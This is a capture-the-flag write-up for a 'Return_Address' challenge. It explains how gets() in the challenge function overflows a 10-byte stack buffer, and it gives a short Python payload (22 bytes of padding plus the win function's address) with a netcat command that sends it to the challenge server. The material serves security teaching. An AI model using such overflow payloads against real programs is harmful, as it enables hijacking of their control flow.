# Challenge `Return_Address` Writeup

- **Vulnerability:** Buffer Overflow
  - _Example: Buffer Overflow, where user input exceeds the buffer size and overwrites the stack, including the return address._
- **Where:** In the `buffer[10]` within the `challenge` function
  - _Example: The buffer overflow vulnerability is present in the `challenge` function where `gets(buffer)` is used to take user input without size check._
- **Impact:** Overwriting the return address to execute the `win` function
  - _Example: By overwriting the return address on the stack, the program can be manipulated to execute the `win` function, resulting in changing the code flow and accessing the flag._
- **NOTE:** The `gets` function is used, which is unsafe due to its inability to limit input size. This allows an attacker to input more characters than the buffer size, leading to a stack overflow and potential control of the program's flow. The address `0xf1\x86\x04\x08` belongs to the `win` function.

## Steps to Reproduce

1. Create a Python script to generate a payload that first fills the buffer and then overwrites the return address.
2. Use a padding of 22 characters (e.g., "ABCDEFGHIJKLMNOPQRSTUV") to fill the buffer and reach the return address.
3. Append the address of the `win` function in little-endian format (`\xf1\x86\x04\x08`) to the padding.
4. Execute the Python script and pipe its output to `nc` to send it to the challenge server.
5. This will overflow the `buffer`, overwrite the return address, and redirect execution to the `win` function when `challenge` returns.

[(POC)](call_win_function_poc.py)

### Python Payload Script (`call_win_function_poc.py`):

````python
padding = "ABCDEFGHIJKLMNOPQRSTUV"
eip = "\xf1\x86\x04\x08"  # Address of win in little-endian format
print(padding + eip)
````
#Command to Send Solution:

````bash
python call_win_function_poc.py | nc mustard.stt.rnl.tecnico.ulisboa.pt 23154
````
